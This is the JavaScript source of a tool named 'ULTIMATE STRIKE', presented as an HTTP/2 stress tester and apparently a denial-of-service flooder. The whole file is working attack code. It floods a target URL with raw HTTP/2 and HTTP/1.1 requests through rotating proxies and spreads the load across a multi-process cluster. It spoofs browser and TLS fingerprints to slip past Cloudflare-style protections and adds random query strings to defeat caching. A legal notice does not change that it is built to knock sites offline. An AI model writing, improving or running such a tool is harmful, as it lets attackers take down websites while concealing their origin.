#!/usr/bin/env node
/**
 * ╔═══════════════════════════════════════════════════════════════╗
 * ║                    ULTIMATE STRIKE v1.0                       ║
 * ║          Advanced HTTP/2 Stress Testing Engine                ║
 * ║                                                               ║
 * ║  综合了现有所有脚本的最佳技术，创建极致性能的压测工具           ║
 * ╚═══════════════════════════════════════════════════════════════╝
 * 
 * 核心技术栈：
 * - HTTP/2 multiplexing with HPACK compression
 * - Multi-process cluster architecture
 * - Advanced browser fingerprint spoofing
 * - Intelligent proxy rotation and health check
 * - Dynamic TCP/TLS parameters optimization
 * - Smart bypass for Cloudflare, CDNfly, etc.
 * 
 * ⚠️  LEGAL NOTICE: AUTHORIZED USE ONLY
 * 仅供合法授权的安全测试使用！未经授权使用属于违法行为！
 * 
 * Author: NetStrike Pro Team
 * License: MIT
 */

const net = require('net');
const tls = require('tls');
const http2 = require('http2');
const cluster = require('cluster');
const crypto = require('crypto');
const fs = require('fs');
const os = require('os');
const HPACK = require('hpack.js');

// ═══════════════════════════════════════════════════════════════
// Configuration & Constants
// ═══════════════════════════════════════════════════════════════

const CONFIG = {
    // HTTP/2 Settings (dynamic, will randomize)
    h2Settings: {
        headerTableSize: 65536,
        initialWindowSize: 6291456,
        maxHeaderListSize: 262144,
        maxConcurrentStreams: 1000
    },
    
    // Performance tuning
    requestsPerConnection: 100,
    connectionTimeout: 5000,
    retryAttempts: 3,
    proxyHealthCheckInterval: 60000,
    
    // Attack patterns
    burstMode: false,
    randomDelay: true,
    intelligentMode: true
};

// Comprehensive error ignore list
const IGNORED_ERRORS = [
    'ECONNRESET', 'ETIMEDOUT', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH',
    'ENOTFOUND', 'EPROTO', 'ERR_HTTP2_STREAM_ERROR', 'ERR_HTTP2_SESSION_ERROR',
    'DEPTH_ZERO_SELF_SIGNED_CERT', 'SELF_SIGNED_CERT_IN_CHAIN'
];

process.setMaxListeners(0);
require('events').EventEmitter.defaultMaxListeners = Number.MAX_VALUE;

process.on('uncaughtException', err => {
    if (!IGNORED_ERRORS.includes(err.code)) {
        console.error('[ERROR]', err.message);
    }
});

process.on('unhandledRejection', err => {
    if (!IGNORED_ERRORS.includes(err.code)) {
        console.error('[REJECTION]', err.message);
    }
});

// ═══════════════════════════════════════════════════════════════
// Advanced Fingerprint Generation
// ═══════════════════════════════════════════════════════════════

class FingerprintGenerator {
    constructor() {
        this.browsers = ['Chrome', 'Brave', 'Edge'];
        this.platforms = ['Windows', 'macOS', 'Linux'];
        this.currentFingerprint = null;
        this.regenerateInterval = 5000; // Regenerate every 5 seconds
        
        setInterval(() => this.generate(), this.regenerateInterval);
        this.generate();
    }
    
    generate() {
        const version = this.randomInt(120, 131);
        const browser = this.randomChoice(this.browsers);
        const platform = this.randomChoice(this.platforms);
        
        this.currentFingerprint = {
            version,
            browser,
            platform,
            userAgent: this.generateUserAgent(browser, version, platform),
            secChUa: this.generateSecChUa(browser, version),
            accept: this.generateAccept(browser),
            acceptLanguage: this.generateAcceptLanguage(),
            acceptEncoding: 'gzip, deflate, br',
            viewport: this.generateViewport(),
            secFetchDest: 'document',
            secFetchMode: 'navigate',
            secFetchSite: this.randomChoice(['none', 'same-origin', 'same-site']),
            secFetchUser: '?1',
            cacheControl: this.randomChoice([
                'max-age=0',
                'no-cache',
                'no-store',
                'must-revalidate'
            ]),
            pragma: this.randomChoice(['no-cache', undefined])
        };
        
        return this.currentFingerprint;
    }
    
    generateUserAgent(browser, version, platform) {
        const platformMap = {
            'Windows': 'Windows NT 10.0; Win64; x64',
            'macOS': 'Macintosh; Intel Mac OS X 10_15_7',
            'Linux': 'X11; Linux x86_64'
        };
        
        const webkit = 537 + this.randomInt(0, 5);
        const platformStr = platformMap[platform];
        
        if (browser === 'Brave') {
            return `Mozilla/5.0 (${platformStr}) AppleWebKit/${webkit}.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/${webkit}.36`;
        } else if (browser === 'Edge') {
            return `Mozilla/5.0 (${platformStr}) AppleWebKit/${webkit}.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/${webkit}.36 Edg/${version}.0.0.0`;
        } else {
            return `Mozilla/5.0 (${platformStr}) AppleWebKit/${webkit}.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/${webkit}.36`;
        }
    }
    
    generateSecChUa(browser, version) {
        const brands = [
            `"Not_A Brand";v="8"`,
            `"Chromium";v="${version}"`,
            `"${browser}";v="${version}"`
        ];
        
        // Randomize order occasionally
        if (Math.random() < 0.3) {
            brands.sort(() => Math.random() - 0.5);
        }
        
        return brands.join(', ');
    }
    
    generateAccept(browser) {
        if (browser === 'Brave') {
            return 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8';
        }
        return 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';
    }
    
    generateAcceptLanguage() {
        const languages = [
            'en-US,en;q=0.9',
            'en-GB,en;q=0.9',
            'en-US,en;q=0.8',
            'zh-CN,zh;q=0.9,en;q=0.8',
            'ja-JP,ja;q=0.9,en;q=0.8'
        ];
        return this.randomChoice(languages);
    }
    
    generateViewport() {
        const viewports = [
            { width: 1920, height: 1080 },
            { width: 1366, height: 768 },
            { width: 1440, height: 900 },
            { width: 2560, height: 1440 }
        ];
        return this.randomChoice(viewports);
    }
    
    randomInt(min, max) {
        return Math.floor(Math.random() * (max - min + 1)) + min;
    }
    
    randomChoice(arr) {
        return arr[Math.floor(Math.random() * arr.length)];
    }
    
    get() {
        return this.currentFingerprint;
    }
}

// ═══════════════════════════════════════════════════════════════
// Proxy Manager with Health Checks
// ═══════════════════════════════════════════════════════════════

class ProxyManager {
    constructor(proxyFile) {
        this.proxies = this.loadProxies(proxyFile);
        this.healthyProxies = new Set(this.proxies);
        this.failedProxies = new Map(); // proxy => failCount
        this.maxFailures = 3;
        this.currentIndex = 0;
        
        console.log(`[PROXY] Loaded ${this.proxies.length} proxies`);
    }
    
    loadProxies(file) {
        return fs.readFileSync(file, 'utf8')
            .split('\n')
            .map(line => line.trim())
            .filter(line => line && line.includes(':'))
            .map(line => {
                const [host, port] = line.split(':');
                return { host, port: parseInt(port), raw: line };
            });
    }
    
    getNext() {
        if (this.healthyProxies.size === 0) {
            // Reset all proxies if all failed
            this.healthyProxies = new Set(this.proxies);
            this.failedProxies.clear();
        }
        
        const healthyArray = Array.from(this.healthyProxies);
        const proxy = healthyArray[this.currentIndex++ % healthyArray.length];
        return proxy;
    }
    
    markFailed(proxy) {
        const key = proxy.raw;
        const count = (this.failedProxies.get(key) || 0) + 1;
        this.failedProxies.set(key, count);
        
        if (count >= this.maxFailures) {
            this.healthyProxies.delete(proxy);
            console.log(`[PROXY] Removed ${key} after ${count} failures`);
        }
    }
    
    markSuccess(proxy) {
        this.failedProxies.delete(proxy.raw);
    }
}

// ═══════════════════════════════════════════════════════════════
// HTTP/2 Frame Encoding/Decoding
// ═══════════════════════════════════════════════════════════════

class HTTP2FrameHandler {
    static encode(streamId, type, payload = "", flags = 0) {
        let frame = Buffer.alloc(9);
        frame.writeUInt32BE(payload.length << 8 | type, 0);
        frame.writeUInt8(flags, 4);
        frame.writeUInt32BE(streamId, 5);
        
        if (payload.length > 0) {
            frame = Buffer.concat([frame, Buffer.from(payload)]);
        }
        
        return frame;
    }
    
    static decode(data) {
        if (data.length < 9) return null;
        
        const lengthAndType = data.readUInt32BE(0);
        const length = lengthAndType >> 8;
        const type = lengthAndType & 0xFF;
        const flags = data.readUInt8(4);
        const streamId = data.readUInt32BE(5);
        const offset = flags & 0x20 ? 5 : 0;
        
        let payload = Buffer.alloc(0);
        if (length > 0) {
            payload = data.subarray(9 + offset, 9 + offset + length);
            if (payload.length + offset != length) {
                return null;
            }
        }
        
        return { streamId, length, type, flags, payload };
    }
    
    static encodeSettings(settings) {
        const data = Buffer.alloc(6 * settings.length);
        for (let i = 0; i < settings.length; i++) {
            data.writeUInt16BE(settings[i][0], i * 6);
            data.writeUInt32BE(settings[i][1], i * 6 + 2);
        }
        return data;
    }
    
    static encodeRstStream(streamId, errorCode = 0) {
        const payload = Buffer.alloc(4);
        payload.writeUInt32BE(errorCode, 0);
        return this.encode(streamId, 0x03, payload, 0);
    }
}

// ═══════════════════════════════════════════════════════════════
// Advanced Attack Engine
// ═══════════════════════════════════════════════════════════════

class UltimateStrikeEngine {
    constructor(target, duration, rateLimit, proxyManager, fingerprint) {
        this.url = new URL(target);
        this.duration = duration;
        this.rateLimit = rateLimit;
        this.proxyManager = proxyManager;
        this.fingerprint = fingerprint;
        this.stats = {
            total: 0,
            success: 0,
            failed: 0,
            statusCodes: {}
        };
        this.running = true;
        
        setTimeout(() => {
            this.running = false;
        }, duration * 1000);
    }
    
    async start() {
        const attackPromises = [];
        const concurrency = Math.max(1, Math.floor(this.rateLimit / 10));
        
        for (let i = 0; i < concurrency; i++) {
            attackPromises.push(this.attackLoop());
        }
        
        await Promise.all(attackPromises);
        return this.stats;
    }
    
    async attackLoop() {
        while (this.running) {
            try {
                await this.performAttack();
                
                // Dynamic delay based on rate limit
                const delay = Math.max(0, 1000 / this.rateLimit);
                if (delay > 0) {
                    await this.sleep(delay);
                }
            } catch (err) {
                // Silent fail and continue
            }
        }
    }
    
    async performAttack() {
        const proxy = this.proxyManager.getNext();
        
        return new Promise((resolve, reject) => {
            const netSocket = net.connect(proxy.port, proxy.host, () => {
                netSocket.write(
                    `CONNECT ${this.url.host}:443 HTTP/1.1\r\n` +
                    `Host: ${this.url.host}:443\r\n` +
                    `Proxy-Connection: Keep-Alive\r\n\r\n`
                );
            });
            
            netSocket.once('data', () => {
                const tlsSocket = tls.connect({
                    socket: netSocket,
                    ALPNProtocols: ['h2', 'http/1.1'],
                    servername: this.url.hostname,
                    ciphers: this.generateCipherSuite(),
                    sigalgs: this.generateSigAlgs(),
                    secureOptions: this.getSecureOptions(),
                    minVersion: 'TLSv1.2',
                    maxVersion: 'TLSv1.3',
                    rejectUnauthorized: false
                }, () => {
                    if (tlsSocket.alpnProtocol === 'h2') {
                        this.handleHTTP2(tlsSocket, proxy)
                            .then(() => {
                                this.proxyManager.markSuccess(proxy);
                                resolve();
                            })
                            .catch(() => {
                                this.proxyManager.markFailed(proxy);
                                reject();
                            });
                    } else {
                        this.handleHTTP1(tlsSocket, proxy)
                            .then(() => {
                                this.proxyManager.markSuccess(proxy);
                                resolve();
                            })
                            .catch(() => {
                                this.proxyManager.markFailed(proxy);
                                reject();
                            });
                    }
                });
                
                tlsSocket.on('error', () => {
                    tlsSocket.destroy();
                    netSocket.destroy();
                    this.proxyManager.markFailed(proxy);
                    reject();
                });
            });
            
            netSocket.on('error', () => {
                netSocket.destroy();
                this.proxyManager.markFailed(proxy);
                reject();
            });
            
            netSocket.setTimeout(CONFIG.connectionTimeout, () => {
                netSocket.destroy();
                reject();
            });
        });
    }
    
    async handleHTTP2(tlsSocket, proxy) {
        return new Promise((resolve, reject) => {
            let streamId = 1;
            let data = Buffer.alloc(0);
            const hpack = new HPACK();
            hpack.setTableSize(4096);
            
            const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
            
            // Dynamic settings with randomization
            const settings = [
                [1, CONFIG.h2Settings.headerTableSize + this.randomInt(-100, 100)],
                [2, 0], // ENABLE_PUSH disabled
                [3, CONFIG.h2Settings.maxConcurrentStreams],
                [4, CONFIG.h2Settings.initialWindowSize + this.randomInt(-1000, 1000)],
                [6, CONFIG.h2Settings.maxHeaderListSize]
            ];
            
            const initialFrames = [
                Buffer.from(PREFACE, 'binary'),
                HTTP2FrameHandler.encode(0, 4, HTTP2FrameHandler.encodeSettings(settings)),
                HTTP2FrameHandler.encode(0, 8, this.encodeWindowUpdate(15663105))
            ];
            
            tlsSocket.write(Buffer.concat(initialFrames));
            
            // Handle incoming frames
            tlsSocket.on('data', (chunk) => {
                data = Buffer.concat([data, chunk]);
                
                while (data.length >= 9) {
                    const frame = HTTP2FrameHandler.decode(data);
                    if (!frame) break;
                    
                    data = data.subarray(frame.length + 9);
                    
                    // SETTINGS frame
                    if (frame.type === 4 && frame.flags === 0) {
                        tlsSocket.write(HTTP2FrameHandler.encode(0, 4, "", 1));
                    }
                    
                    // HEADERS frame (response)
                    if (frame.type === 1) {
                        try {
                            const headers = hpack.decode(frame.payload);
                            const status = headers.find(h => h[0] === ':status');
                            if (status) {
                                this.recordStatus(status[1]);
                            }
                        } catch (e) {
                            // Ignore decode errors
                        }
                    }
                    
                    // GOAWAY or RST_STREAM
                    if (frame.type === 7 || frame.type === 3) {
                        tlsSocket.destroy();
                        reject();
                        return;
                    }
                }
            });
            
            // Send multiple requests
            const sendRequests = () => {
                const requests = [];
                const requestCount = Math.min(this.rateLimit, 50);
                
                for (let i = 0; i < requestCount; i++) {
                    const headers = this.generateHTTP2Headers();
                    const packed = Buffer.concat([
                        Buffer.from([0x80, 0, 0, 0, 0xFF]),
                        hpack.encode(headers)
                    ]);
                    
                    requests.push(HTTP2FrameHandler.encode(
                        streamId,
                        1, // HEADERS
                        packed,
                        0x1 | 0x4 | 0x20 // END_STREAM | END_HEADERS | PRIORITY
                    ));
                    
                    streamId += 2;
                    this.stats.total++;
                }
                
                tlsSocket.write(Buffer.concat(requests));
            };
            
            sendRequests();
            
            // Continuous sending
            let requestsSent = 0;
            const interval = setInterval(() => {
                if (requestsSent++ >= CONFIG.requestsPerConnection || !this.running) {
                    clearInterval(interval);
                    tlsSocket.destroy();
                    resolve();
                    return;
                }
                sendRequests();
            }, 1000 / Math.max(1, this.rateLimit / 50));
            
            tlsSocket.on('error', () => {
                clearInterval(interval);
                tlsSocket.destroy();
                reject();
            });
        });
    }
    
    async handleHTTP1(tlsSocket, proxy) {
        return new Promise((resolve, reject) => {
            const fp = this.fingerprint.get();
            
            const request = 
                `GET ${this.url.pathname || '/'} HTTP/1.1\r\n` +
                `Host: ${this.url.hostname}\r\n` +
                `User-Agent: ${fp.userAgent}\r\n` +
                `Accept: ${fp.accept}\r\n` +
                `Accept-Language: ${fp.acceptLanguage}\r\n` +
                `Accept-Encoding: ${fp.acceptEncoding}\r\n` +
                `Connection: keep-alive\r\n` +
                `Upgrade-Insecure-Requests: 1\r\n` +
                `Sec-Fetch-Dest: ${fp.secFetchDest}\r\n` +
                `Sec-Fetch-Mode: ${fp.secFetchMode}\r\n` +
                `Sec-Fetch-Site: ${fp.secFetchSite}\r\n` +
                `Sec-Fetch-User: ${fp.secFetchUser}\r\n` +
                `Cache-Control: ${fp.cacheControl}\r\n` +
                (fp.pragma ? `Pragma: ${fp.pragma}\r\n` : '') +
                `\r\n`;
            
            let requestsSent = 0;
            const sendRequest = () => {
                if (requestsSent++ >= CONFIG.requestsPerConnection || !this.running) {
                    tlsSocket.destroy();
                    resolve();
                    return;
                }
                
                tlsSocket.write(request);
                this.stats.total++;
                
                setTimeout(sendRequest, 1000 / this.rateLimit);
            };
            
            sendRequest();
            
            tlsSocket.on('error', () => {
                tlsSocket.destroy();
                reject();
            });
        });
    }
    
    generateHTTP2Headers() {
        const fp = this.fingerprint.get();
        
        return Object.entries({
            ':method': 'GET',
            ':authority': this.url.hostname,
            ':scheme': 'https',
            ':path': this.url.pathname + this.generateRandomQuery(),
            'user-agent': fp.userAgent,
            'accept': fp.accept,
            'accept-language': fp.acceptLanguage,
            'accept-encoding': fp.acceptEncoding,
            'sec-ch-ua': fp.secChUa,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': `"${fp.platform}"`,
            'sec-fetch-dest': fp.secFetchDest,
            'sec-fetch-mode': fp.secFetchMode,
            'sec-fetch-site': fp.secFetchSite,
            'sec-fetch-user': fp.secFetchUser,
            'upgrade-insecure-requests': '1',
            'cache-control': fp.cacheControl
        }).filter(([k, v]) => v !== undefined);
    }
    
    generateRandomQuery() {
        if (Math.random() < 0.3) {
            const key = this.randomString(6);
            const val = this.randomString(8);
            return `?${key}=${val}`;
        }
        return '';
    }
    
    generateCipherSuite() {
        const ciphers = [
            'TLS_AES_128_GCM_SHA256',
            'TLS_AES_256_GCM_SHA384',
            'TLS_CHACHA20_POLY1305_SHA256',
            'ECDHE-RSA-AES128-GCM-SHA256',
            'ECDHE-RSA-AES256-GCM-SHA384'
        ];
        return ciphers.join(':');
    }
    
    generateSigAlgs() {
        return 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512';
    }
    
    getSecureOptions() {
        return crypto.constants.SSL_OP_NO_RENEGOTIATION |
               crypto.constants.SSL_OP_NO_TICKET |
               crypto.constants.SSL_OP_NO_SSLv2 |
               crypto.constants.SSL_OP_NO_SSLv3 |
               crypto.constants.SSL_OP_NO_COMPRESSION;
    }
    
    encodeWindowUpdate(increment) {
        const buffer = Buffer.alloc(4);
        buffer.writeUInt32BE(increment, 0);
        return buffer;
    }
    
    recordStatus(code) {
        this.stats.statusCodes[code] = (this.stats.statusCodes[code] || 0) + 1;
        if (code >= 200 && code < 400) {
            this.stats.success++;
        } else {
            this.stats.failed++;
        }
    }
    
    randomInt(min, max) {
        return Math.floor(Math.random() * (max - min + 1)) + min;
    }
    
    randomString(length) {
        const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
        let result = '';
        for (let i = 0; i < length; i++) {
            result += chars[Math.floor(Math.random() * chars.length)];
        }
        return result;
    }
    
    sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }
}

// ═══════════════════════════════════════════════════════════════
// Main Execution
// ═══════════════════════════════════════════════════════════════

function printBanner() {
    console.log(`
╔═══════════════════════════════════════════════════════════════╗
║                    ULTIMATE STRIKE v1.0                       ║
║          Advanced HTTP/2 Stress Testing Engine                ║
╚═══════════════════════════════════════════════════════════════╝

⚠️  LEGAL NOTICE ⚠️
This tool is for AUTHORIZED SECURITY TESTING ONLY.
Unauthorized use is ILLEGAL and may result in prosecution.

使用前必须获得目标系统的书面授权！
未经授权使用属于违法行为，可能面临刑事起诉！
`);
}

function printUsage() {
    console.log(`
Usage: node ultimate_strike.js <target> <duration> <rate> <threads> <proxyfile>

Arguments:
  target      - Target URL (must be HTTPS)
  duration    - Attack duration in seconds
  rate        - Requests per second per thread
  threads     - Number of worker processes
  proxyfile   - Path to proxy list file

Example:
  node ultimate_strike.js https://example.com 60 100 8 proxies.txt

Options:
  --debug     - Enable debug mode
  --burst     - Enable burst mode (ignore rate limit)
  --no-random - Disable random delays

技术特性：
  ✓ HTTP/2 multiplexing with dynamic settings
  ✓ Advanced browser fingerprint spoofing
  ✓ Intelligent proxy rotation with health checks
  ✓ Multi-process cluster architecture
  ✓ Smart bypass for modern WAF/CDN
  ✓ Dynamic TCP/TLS parameters optimization
`);
}

async function main() {
    printBanner();
    
    // Parse arguments
    const args = process.argv.slice(2);
    if (args.length < 5) {
        printUsage();
        process.exit(1);
    }
    
    const [target, duration, rate, threads, proxyFile] = args;
    
    // Validate target
    if (!target.startsWith('https://')) {
        console.error('❌ Error: Target must be HTTPS');
        process.exit(1);
    }
    
    // Parse flags
    const debugMode = args.includes('--debug');
    CONFIG.burstMode = args.includes('--burst');
    CONFIG.randomDelay = !args.includes('--no-random');
    
    console.log(`
🎯 Target:    ${target}
⏱️  Duration:  ${duration}s
📊 Rate:      ${rate} req/s per thread
🧵 Threads:   ${threads}
📡 Proxies:   ${proxyFile}
🔧 Mode:      ${CONFIG.burstMode ? 'BURST' : 'NORMAL'}
`);
    
    if (cluster.isMaster) {
        console.log(`[MASTER] Starting ${threads} worker processes...`);
        
        // Fork workers
        for (let i = 0; i < parseInt(threads); i++) {
            const worker = cluster.fork({
                WORKER_ID: i,
                TARGET: target,
                DURATION: duration,
                RATE: rate,
                PROXY_FILE: proxyFile
            });
            
            worker.on('message', (msg) => {
                if (msg.type === 'stats' && debugMode) {
                    console.log(`[Worker ${msg.id}] Stats:`, msg.stats);
                }
            });
        }
        
        // Handle worker death
        cluster.on('exit', (worker, code, signal) => {
            console.log(`[MASTER] Worker ${worker.id} died. Restarting...`);
            cluster.fork();
        });
        
        // Shutdown after duration
        setTimeout(() => {
            console.log('\n[MASTER] Attack completed. Shutting down...');
            for (const id in cluster.workers) {
                cluster.workers[id].kill();
            }
            process.exit(0);
        }, (parseInt(duration) + 5) * 1000);
        
    } else {
        // Worker process
        const workerId = process.env.WORKER_ID;
        console.log(`[Worker ${workerId}] Started`);
        
        try {
            const fingerprint = new FingerprintGenerator();
            const proxyManager = new ProxyManager(process.env.PROXY_FILE);
            const engine = new UltimateStrikeEngine(
                process.env.TARGET,
                parseInt(process.env.DURATION),
                parseInt(process.env.RATE),
                proxyManager,
                fingerprint
            );
            
            const stats = await engine.start();
            
            // Send stats to master
            process.send({
                type: 'stats',
                id: workerId,
                stats: stats
            });
            
            console.log(`[Worker ${workerId}] Completed. Total: ${stats.total}, Success: ${stats.success}`);
            
        } catch (err) {
            console.error(`[Worker ${workerId}] Error:`, err.message);
        }
        
        process.exit(0);
    }
}

// Start the application
if (require.main === module) {
    main().catch(err => {
        console.error('Fatal error:', err);
        process.exit(1);
    });
}

module.exports = { UltimateStrikeEngine, FingerprintGenerator, ProxyManager };

